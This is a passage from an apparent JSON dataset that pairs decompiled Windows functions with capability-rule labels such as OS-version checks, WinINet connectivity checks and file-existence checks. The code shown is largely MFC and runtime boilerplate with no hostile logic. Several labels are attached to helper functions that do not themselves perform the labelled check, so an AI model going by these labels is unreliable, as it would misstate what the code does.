        "decompiled_code": "\nvoid __thiscall fcn.00435b69(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if ((*(*(param_1 + 0x14) + -0xc) != 0) &&\n       ((*(param_1 + 0x10) != 3 ||\n        (((*(*(param_1 + 0x18) + -0xc) != 0 && (*(*(param_1 + 0x1c) + -0xc) != 0)) && (*(*(param_1 + 0x20) + -0xc) != 0)\n         ))))) {\n        return;\n    }\n    if (param_2 == NULL) {\n        fcn.00402f80(0, 0);\n        return;\n    }\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00402f80(param_2, pcVar2 - (param_2 + 1));\n    return;\n}\n",
        "token_count": 254
    },
    "004365b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004365b6(code **param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    param_1[5] = 0xc0000001;\n    fcn.004094ec();\n    iVar2 = fcn.00434fe8();\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(iVar2 + 0x2c);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.00434fe8();\n    if (*(iVar2 + 0x30) == 0) {\n        fcn.00434191(1);\n        iVar2 = fcn.00434fe8();\n        iVar2 = *(iVar2 + 4);\n        if ((iVar2 == 0) || (*(iVar2 + 0x1c) == 0)) {\n            iVar2 = fcn.00434fe8();\n            if (*(iVar2 + 0x14) == '\\0') {\n                fcn.0043a912(0);\n            }\n        }\n        else {\n            iVar1 = fcn.0041cdda();\n            if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x004341de. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(**(iVar2 + 0x1c) + 0x60))();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "00437466": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00437466(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x0043746d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0043763e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043763e(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        if (*param_1 != NULL) {\n            (****param_1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00437885": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437885(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.00437676(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    (***arg_8h)(1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 359
    },
    "00437a0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00437a0b(int32_t param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint unaff_retaddr;\n    \n    puVar3 = *0x450d94;\n    if (*0x450d94 != NULL) {\n        puVar1 = *0x450d94 + 7;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        if (param_1 == 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar3);\n            if (iVar4 != 0) {\n                fcn.00437885(iVar4, unaff_retaddr);\n            }\n        }\n        else {\n            iVar4 = puVar3[5];\n            while (iVar4 != 0) {\n                iVar2 = *(iVar4 + 4);\n                fcn.00437885(iVar4, param_2);\n                iVar4 = iVar2;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "00437973": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00437973(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    if (*extraout_ECX == 0) {\n        if (*0x450d94 == 0) {\n            *(unaff_EBP + -0x10) = 0x450d98;\n            *(unaff_EBP + -4) = 0;\n            *0x450d94 = fcn.004376bd();\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        iVar1 = fcn.00437476();\n        *extraout_ECX = iVar1;\n    }\n    iVar1 = fcn.00437582(*extraout_ECX);\n    if (iVar1 == 0) {\n        iVar1 = (**(unaff_EBP + 8))();\n        fcn.00437762(*extraout_ECX, iVar1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 323
    },
    "00437aa2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00437aa2(void)\n\n{\n    if (*0x450fc8 == 0) {\n        *0x450fc8 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x450e14);\n    }\n    return *0x450fc8;\n}\n",
        "token_count": 69
    },
    "00437b0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00437b0b(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (*0x450fc8 == 0) {\n        fcn.00437aa2();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    piVar1 = param_1 * 4 + 0x450dd0;\n    if (*piVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x450e14);\n        if (*piVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x450e30);\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x450e14);\n    }\n    (*pcVar2)(param_1 * 0x18 + 0x450e30);\n    return;\n}\n",
        "token_count": 225
    },
    "00437ca7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00437ca7(uint lpAppName, uint lpValueName, int32_t nDefault)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        nDefault = (*_sym.imp.KERNEL32.dll_GetPrivateProfileIntA)(lpAppName, lpValueName, nDefault, *(in_ECX + 100));\n    }\n    else {\n        var_4h = in_ECX;\n        iVar1 = fcn.00437c61(lpAppName);\n        if (iVar1 != 0) {\n            lpAppName = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iVar1, lpValueName, 0, &var_8h, &var_4h, &lpAppName);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n            if (iVar2 == 0) {\n                return var_4h;\n            }\n        }\n    }\n    return nDefault;\n}\n",
        "token_count": 258
    },
    "00437e5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00437e5f(uint phkResult, uint lpString, int32_t lpValueName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    if (lpValueName == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)(0x80000000, phkResult, 1, lpString, uVar1);\n        bVar4 = iVar2 == 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(0x80000000, phkResult, &phkResult);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(phkResult, lpValueName, 0, 1, lpString, iVar2 + 1);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if ((iVar3 == 0) && (iVar2 == 0)) {\n                return true;\n            }\n        }\n        bVar4 = false;\n    }\n    return bVar4;\n}\n",
        "token_count": 306
    },
    "00438065": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438065(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    \n    if (arg_8h == 0) {\n        fcn.004010c0(0x80070057);\n    }\n    uVar1 = fcn.0040cb03(arg_8h, arg_ch);\n    arg_8h_00 = fcn.004026d0(uVar1);\n    fcn.0040caac(arg_8h_00, arg_8h, arg_ch);\n    fcn.00401410(uVar1);\n    return;\n}\n",
        "token_count": 145
    },
    "004386de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.004386de(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(param_1);\n    if (param_1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n        iVar2 = iVar2 + 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(param_1, uVar1, param_2);\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 148
    },
    "0043870d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043870d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uchar auStack784 [256];\n    uchar auStack528 [260];\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    iVar1 = fcn.00434fe8();\n    *(iVar1 + 8) = *(param_1 + 0x40);\n    *(iVar1 + 0xc) = *(param_1 + 0x40);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(param_1 + 0x40), auStack528, 0x104);\n    if ((iVar2 == 0) || (iVar2 == 0x104)) {\n        fcn.00425f38();\n    }\n    puVar3 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)(auStack528);\n    if (puVar3 == NULL) {\n        fcn.00425f38();\n    }\n    *puVar3 = 0;\n    iVar2 = fcn.004386de(auStack528, auStack268, 0x104);\n    if (iVar2 != 0) {\n        fcn.00425f38();\n    }\n    if (*(param_1 + 0x5c) == 0) {\n        uVar4 = fcn.0040c96e(auStack268);\n        *(param_1 + 0x5c) = uVar4;\n    }\n    if (*(param_1 + 0x4c) == 0) {\n        iVar2 = fcn.0041bbb0(0xe000, auStack784, 0x100);\n        if (iVar2 == 0) {\n            puVar5 = *(param_1 + 0x5c);\n        }\n        else {\n            puVar5 = auStack784;\n        }\n        uVar4 = fcn.0040c96e(puVar5);\n        *(param_1 + 0x4c) = uVar4;\n    }\n    *(iVar1 + 0x10) = *(param_1 + 0x4c);\n    if (*(param_1 + 0x60) == 0) {\n        if (*(param_1 + 0x68) == 1) {\n            pcVar6 = \".CHM\";\n        }\n        else {\n            pcVar6 = \".HLP\";\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar3, pcVar6);\n        uVar4 = fcn.0040c96e(auStack528);\n        *(param_1 + 0x60) = uVar4;\n        *puVar3 = 0;\n    }\n    if (*(param_1 + 100) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack268, \".INI\");\n        uVar4 = fcn.0040c96e(auStack268);\n        *(param_1 + 100) = uVar4;\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 729
    },
    "0043885b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0043885b(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.00434fe8();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    iVar3 = fcn.00434fe8();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x44) = param_1;\n        *(iVar3 + 0x48) = param_2;\n        *(iVar3 + 0x40) = unaff_ESI;\n        fcn.0043870d();\n    }\n    iVar3 = fcn.00434fe8();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.0041d672();\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar3 != 0) {\n        *0x450aa4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 337
    },
    "004389cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004389cc(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1[2] != 0) {\n        iVar1 = (**(*param_1[2] + 8))(param_1[2]);\n        return iVar1;\n    }\n    if (param_1[1] == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(param_1 + 1);\n    if (iVar1 == 0) {\n        (**(*param_1 + 0x10))();\n    }\n    return iVar1;\n}\n",
        "token_count": 148
    },
    "00438a8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00438a8f(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 294
    },
    "00439ac7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00439ac7(uint param_1)\n\n{\n    fcn.0043500e();\n    fcn.0041b576(param_1);\n    return;\n}\n",
        "token_count": 40
    },
    "0043a0e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a0e5(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *arg_ch_00;\n    uint32_t uVar2;\n    uint readfds;\n    int32_t var_108h;\n    uint timeout;\n    uint var_4h;\n    \n    if (((arg_8h != 0) || (arg_ch != 0)) && (iVar1 = fcn.00439ac7(arg_8h, 1),  iVar1 == 0)) {\n        arg_ch_00 = fcn.00439ac7(arg_8h, 0);\n        if (arg_ch_00 == NULL) {\n            fcn.0043500e();\n            arg_ch_00 = fcn.0041b576(0xffffffff);\n            if (arg_ch_00 == NULL) {\n                return;\n            }\n            arg_ch_00[1] = arg_8h;\n            fcn.0043a005(0xffffffff, 0);\n            fcn.00439f3e(arg_ch_00[1], arg_ch_00, 0);\n        }\n        uVar2 = arg_ch & 0xffff;\n        arg_ch = arg_ch >> 0x10;\n        if (uVar2 == 1) {\n            var_108h = arg_ch_00[1];\n            timeout = 0;\n            var_4h = 0;\n            readfds = 1;\n            iVar1 = (*_sym.imp.WS2_32.dll_select)(0, &readfds, 0, 0, &timeout);\n            if (iVar1 == -1) {\n                arg_ch = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            }\n            if ((iVar1 == 1) || (arg_ch != 0)) {\n                (**(*arg_ch_00 + 0x1c))(arg_ch);\n            }\n        }\n        else if (uVar2 == 2) {\n            (**(*arg_ch_00 + 0x20))(arg_ch);\n        }\n        else if (uVar2 == 4) {\n            (**(*arg_ch_00 + 0x24))(arg_ch);\n        }\n        else if (uVar2 == 8) {\n            (**(*arg_ch_00 + 0x28))(arg_ch);\n        }\n        else if (uVar2 == 0x10) {\n            (**(*arg_ch_00 + 0x2c))(arg_ch);\n        }\n        else if (uVar2 == 0x20) {\n            (**(*arg_ch_00 + 0x30))(arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 587
    },
    "0043a97d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0043a97d(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.CDocManager.0;\n    pcVar1 = extraout_ECX[2];\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        *(unaff_EBP + -0x14) = pcVar1;\n        ppiVar3 = fcn.0040854e(unaff_EBP + -0x10);\n        piVar2 = *ppiVar3;\n        if (piVar2[7] != 0) {\n            fcn.0041aecd(*(unaff_EBP + -0x14));\n            (**(*piVar2 + 4))(1);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041af4f();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 414
    },
    "0040c198": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c198(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4432f8, 0x14);\n    *(unaff_EBP + -0x20) = 0xffffffff;\n    fcn.0040d40a(0xd);\n    *(unaff_EBP + -4) = 0;\n    *0x451014 = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == -2) {\n        *0x451014 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (iVar1 == -3) {\n        *0x451014 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (iVar1 == -4) {\n        *0x451014 = 1;\n        iVar1 = *0x451358;\n    }\n    *(unaff_EBP + 8) = iVar1;\n    arg_8h_00 = *0x4527c0;\n    if (iVar1 == *0x4528e4) {\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x24) = *0x4527c0;\n        if ((arg_8h_00 == NULL) || (*arg_8h_00 != 0)) {\n            arg_8h_00 = fcn.00409f36(0x220);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n        }\n        if (arg_8h_00 != NULL) {\n            iVar1 = fcn.0040c008(*(unaff_EBP + 8));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *arg_8h_00 = 0;\n                arg_8h_00[1] = *0x4528e4;\n                arg_8h_00[2] = *0x4527c4;\n                arg_8h_00[3] = *0x4527bc;\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 5; iVar1 = iVar1 + 1) {\n                    *(arg_8h_00 + iVar1 * 2 + 0x10) = *(iVar1 * 2 + 0x4528f0);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 0x101; iVar1 = iVar1 + 1) {\n                    *(iVar1 + 0x1c + arg_8h_00) = *(iVar1 + 0x4527e0);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  *0x4527c0 = arg_8h_00,  iVar1 < 0x100; iVar1 = iVar1 + 1)\n                {\n                    *(iVar1 + 0x11d + arg_8h_00) = *(iVar1 + 0x452900);\n                }\n            }\n        }\n        if ((*(unaff_EBP + -0x20) == -1) && (arg_8h_00 != *0x4527c0)) {\n            fcn.00409f48(arg_8h_00);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040c2df();\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 917
    },
    "0040fa5f": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040fa5f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443b30, 0x14);\n    if ((-1 < *(unaff_EBP + 8)) && (*(unaff_EBP + 8) < 6)) {\n        fcn.0040d40a(0xc);\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + 0xc) == 0) {\n            fcn.0040f886();\n            fcn.0040a0de(unaff_EBP + -0x10, 0xffffffff);\n        }\n        else {\n            arg_8h_00 = fcn.00409f36(0x54);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n            if (arg_8h_00 == NULL) {\n                *(unaff_EBP + -0x1c) = 0;\n            }\n            else {\n                iVar1 = fcn.0040f886();\n                *(unaff_EBP + -0x1c) = iVar1;\n                if (iVar1 != 0) {\n                    *arg_8h_00 = 0;\n                    arg_8h_00[1] = *0x451358;\n                    arg_8h_00[2] = *0x45135c;\n                    for (iVar1 = 0; *(unaff_EBP + -0x20) = iVar1,  iVar1 < 6; iVar1 = iVar1 + 1) {\n                        arg_8h_00[iVar1 + 3] = *(iVar1 * 4 + 0x451340);\n                    }\n                    arg_8h_00[9] = *0x44e680;\n                    arg_8h_00[10] = *0x44e870;\n                    arg_8h_00[0xb] = *0x452670;\n                    arg_8h_00[0xc] = *0x452674;\n                    arg_8h_00[0xd] = *0x45266c;\n                    arg_8h_00[0xe] = *0x44e0dc;\n                    arg_8h_00[0xf] = *0x451450;\n                    arg_8h_00[0x10] = *0x452668;\n                    arg_8h_00[0x11] = *0x452664;\n                    arg_8h_00[0x12] = *0x44e330;\n                    arg_8h_00[0x13] = *0x44e7b0;\n                    arg_8h_00[0x14] = *0x45144c;\n                    if ((**0x44e394 == 0) && (*0x44e394 != 0x44e340)) {\n                        fcn.0040f0bf(*0x44e394);\n                    }\n                    *0x44e394 = arg_8h_00;\n                    fcn.0040f18f();\n                }\n            }\n            if ((*(unaff_EBP + -0x1c) == 0) && (arg_8h_00 != NULL)) {\n                fcn.00409f48(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040fba8();\n        }\n    }\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 861
    },
    "004011c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004011c0(int32_t param_1)\n\n{\n    fcn.0041885b(0);\n    if (*(param_1 + 4) != -1) {\n        *(param_1 + 4) = *(param_1 + 4) + 1;\n    }\n    fcn.0041887e();\n    return;\n}\n",
        "token_count": 82
    },
    "004011f0": {
        "rules": [
